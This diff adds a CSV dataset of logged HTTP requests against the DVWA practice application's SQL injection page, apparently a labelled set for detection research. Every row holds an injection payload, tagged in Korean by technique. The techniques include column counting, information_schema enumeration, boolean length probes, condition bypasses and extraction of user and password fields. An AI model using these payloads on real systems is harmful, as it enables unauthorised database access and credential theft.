@@ -1,0 +1,86 @@
+ip,date,method,uri,payload,injection_format
+172.20.10.2,19/May/2024:05:12:55 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT user,password FROM dvwa.users LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:55 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=45' UNION SELECT 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:55 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=76' UNION SELECT user,password FROM dvwa.users LIMIT 1,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=60' UNION SELECT comment,name FROM DVWA.GUESTBOOK LIMIT 1,1#&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=98' UNION SELECT 1, table_name FROM information_schema.tables #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=38' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=66' UNION select 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=6) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=37' UNION SELECT 1, table_name from information_schema.tables #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=10' OR TRUE #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=37' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=20' UNION SELECT 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=10' UNION SELECT table_name,2 FROM information_schema.tables #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=54' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' and table_schema='dvwa' #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=30' UNION SELECT 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=67' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=64' UNION SELECT 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=58' union SELECT comment,name FROM dvwa.guestbook #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=68' OR '1'='1' LIMIT 1 #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=8) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='guestbook' AND LENGTH(column_name)=2) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=33' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 from information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=3) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=4' OR TRUE #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='guestbook' AND LENGTH(column_name)=7) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1, 2 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=56' UNION SELECT 1, table_name FROM information_schema.tables #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=58' UNION SELECT COMMENT,NAME FROM dvwa.guestbook #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=98' UNION select 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=33' union SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 3,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=84' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 3,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=84' UNION select 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=28' OR '1'='1' LIMIT 1 #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='dvwa' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=12' UNION SELECT user,password FROM dvwa.users LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION select 1, 2 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (select 1 FROM INFORMATION_SCHEMA.COLUMNS where table_schema='dvwa' AND table_name='users' and LENGTH(column_name)=6) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='guestbook' AND LENGTH(column_name)=4) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=97' UNION select table_name,2 FROM information_schema.tables #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=65' OR '1'='1' LIMIT 1 #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=94' UNION SELECT 1,column_name FROM information_schema.columns WHERE TABLE_NAME='GUESTBOOK' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=33' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=33' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=64' union select 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=40' UNION SELECT 1,column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' AND table_schema='dvwa' #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1,column_name FROM information_schema.columns WHERE TABLE_NAME='USERS' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=96' UNION SELECT 1, 2 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=97' UNION SELECT table_name,2 FROM information_schema.tables #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=87' UNION SELECT database(), 2 #&Submit=Submit",DB 이름
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION select 1,column_name FROM information_schema.columns where table_name='users' AND TABLE_SCHEMA='DVWA' #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=3' UNION SELECT 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:12:59 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=97' union select table_name,2 FROM information_schema.tables #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=20' OR 1=1 LIMIT 5 #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=72' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=84' UNION SELECT 1, 2, 3, 4, 5 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=77' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1,table_name FROM information_schema.tables WHERE TABLE_SCHEMA='DVWA' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=87' UNION select DATABASE(), 2 #&Submit=Submit",DB 이름
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=60' UNION SELECT 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' union SELECT 1,table_name FROM INFORMATION_SCHEMA.TABLES where table_schema='dvwa' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=66' union SELECT 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' union SELECT 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=10' UNION SELECT 1, 2, 3, 4, 5, 6, 7 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=95' UNION SELECT 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=66' UNION SELECT 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=63' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' #&Submit=Submit",UNION SELECT 테이블 이름
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=12' union select user,password FROM dvwa.users LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=37' UNION SELECT 1,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='USERS' and table_schema='dvwa' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=59' OR TRUE #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:13:00 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=97' union SELECT TABLE_NAME,2 FROM information_schema.tables #&Submit=Submit",UNION SELECT 컬럼의 정보
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=23' union SELECT DATABASE(), 2 #&Submit=Submit",DB 이름
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=13' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=67' OR '1'='1' LIMIT 1 #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=61' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=35' UNION SELECT 1 #&Submit=Submit,UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=60' OR TRUE LIMIT 1 #&Submit=Submit,조건문 우회
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=45' union select 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=1) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=17' UNION SELECT 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=3) #&Submit=Submit,컬럼 길이
+172.20.10.2,19/May/2024:05:13:01 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=33' UNION select 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 3,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
